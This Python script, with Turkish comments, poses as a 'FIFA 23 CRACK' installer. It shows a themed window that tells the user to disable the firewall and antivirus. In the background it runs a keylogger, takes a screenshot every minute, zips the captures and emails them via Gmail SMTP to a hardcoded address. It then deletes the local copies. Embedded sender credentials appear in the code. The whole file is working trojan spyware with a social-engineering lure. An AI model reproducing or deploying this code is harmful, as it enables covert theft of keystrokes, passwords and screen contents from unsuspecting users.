import tkinter as tk
import pygame
from PIL import Image, ImageTk
from pynput.keyboard import Key, Listener
import os
import time
import pyautogui
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading

# Masaüstü konumunu al
masaustu = os.path.join(os.path.expanduser("~"), "Desktop")

# 'verileri', 'ss' ve 'klavye' klasörlerini oluştur
verileri_klasoru = os.path.join(masaustu, "verileri")
os.makedirs(verileri_klasoru, exist_ok=True)

ss_klasoru = os.path.join(verileri_klasoru, "ss")
os.makedirs(ss_klasoru, exist_ok=True)

klavye_klasoru = os.path.join(verileri_klasoru, "klavye")
os.makedirs(klavye_klasoru, exist_ok=True)

# Klavye hareketlerini kaydedeceğimiz dosyanın adı
klavye_dosyasi = os.path.join(klavye_klasoru, "klavye.txt")

# Klavye hareketlerini kaydetme fonksiyonu
def on_press(key):
    with open(klavye_dosyasi, 'a') as f:
        f.write(str(key) + '\n')

# Klavye dinleyicisini başlat
listener = Listener(on_press=on_press)
listener.start()

# E-posta detayları
gonderen_email = "bilgitoplamasistemi@gmail.com"  # Gönderenin e-posta adresi
alici_email = "erdirden3@gmail.com"  # Alıcının e-posta adresi
konu = "Veriler Klasoru"
sifre = "gglh ixme ccmr hpgo"  # Gönderenin e-posta şifresi

def hosgeldiniz_yaz():
    canvas.itemconfigure(buton_window, state='hidden')  # Butonu gizle
    hosgeldiniz_etiketi = canvas.create_text(pencere_genislik/2, pencere_yukseklik/2 + 50, text="CRACK YAPABILIRSINIZ.. IYI OYUNLAR :))", font=("Arial", 14), fill="white")

def pencere_kapatildi():
    pygame.mixer.music.stop()  # Müziği durdur
    pencere.destroy()  # Pencereyi kapat

pencere = tk.Tk()
pencere.title("FIFA 23 CRACK")
pencere.protocol("WM_DELETE_WINDOW", pencere_kapatildi)  # Pencere kapatıldığında müziği durdur
pencere.wm_iconbitmap('icon.ico')  # Pencere simgesini ayarla


# Pencereyi ekranın ortasına yerleştir
ekran_genislik = pencere.winfo_screenwidth()
ekran_yukseklik = pencere.winfo_screenheight()
pencere_genislik = 600
pencere_yukseklik = 400
konum_x = int((ekran_genislik/2) - (pencere_genislik/2))
konum_y = int((ekran_yukseklik/2) - (pencere_yukseklik/2))
pencere.geometry(f"{pencere_genislik}x{pencere_yukseklik}+{konum_x}+{konum_y}")

# Arkaplanı ayarla
resim = Image.open("FC24.jpg")  # Arka plan resmi dosya yolu
resim = resim.resize((pencere_genislik, pencere_yukseklik), Image.ANTIALIAS)
canvas = tk.Canvas(pencere, width=pencere_genislik, height=pencere_yukseklik)
canvas.pack(fill="both", expand=True)
arkaplan = ImageTk.PhotoImage(resim)
canvas.create_image(0, 0, image=arkaplan, anchor="nw")

# "Aşağıdaki butona basınız" yazısı
yazi = canvas.create_text(pencere_genislik/2, pencere_yukseklik/2 - 60, text="FIFA24 crack islemi yapabilmek icin\nguvenlik duvarini ve virus denetimini kapatip\nasagidaki butona basiniz.\n\n\n", font=("Arial", 14), fill="white")

buton = tk.Button(pencere, text="HAZIR", command=hosgeldiniz_yaz, font=("Arial", 18), height=1, width=8)
buton_window = canvas.create_window(pencere_genislik/2, pencere_yukseklik/2, window=buton)

# Müziği oynat
pygame.mixer.init()
pygame.mixer.music.load("music.mp3")  # Müzik dosya yolu
pygame.mixer.music.play(loops=-1)

def veri_toplama():
    i = 0
    while True:
        # Ekran görüntüsü al
        ekran_goruntusu = pyautogui.screenshot()

        # Ekran görüntüsünü 'ss' klasörüne kaydet
        dosya_adi = f"ekran_goruntusu_{i}.png"
        dizin = os.path.join(ss_klasoru, dosya_adi)
        ekran_goruntusu.save(dizin)

        # 'verileri' klasörünü zip'le
        shutil.make_archive(verileri_klasoru, 'zip', verileri_klasoru)

        # E-posta mesajını oluştur
        msg = MIMEMultipart()
        msg['From'] = gonderen_email
        msg['To'] = alici_email
        msg['Subject'] = konu

        # Zip dosyasını e-postaya ekleyin
        with open(verileri_klasoru + '.zip', 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment', filename=verileri_klasoru + '.zip')
            msg.attach(part)

        # E-postayı gönder
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(gonderen_email, sifre)
        text = msg.as_string()
        server.sendmail(gonderen_email, alici_email, text)
        server.quit()

        # 'verileri' klasörünü ve içindekileri sil
        shutil.rmtree(verileri_klasoru)
        os.makedirs(verileri_klasoru, exist_ok=True)
        os.makedirs(ss_klasoru, exist_ok=True)
        os.makedirs(klavye_klasoru, exist_ok=True)

        time.sleep(60)  # Her 60 saniyede bir ekran görüntüsü al ve e-posta gönder
        i += 1

# Veri toplama işlemini ayrı bir iş parçacığı olarak başlat
threading.Thread(target=veri_toplama).start()


pencere.mainloop()

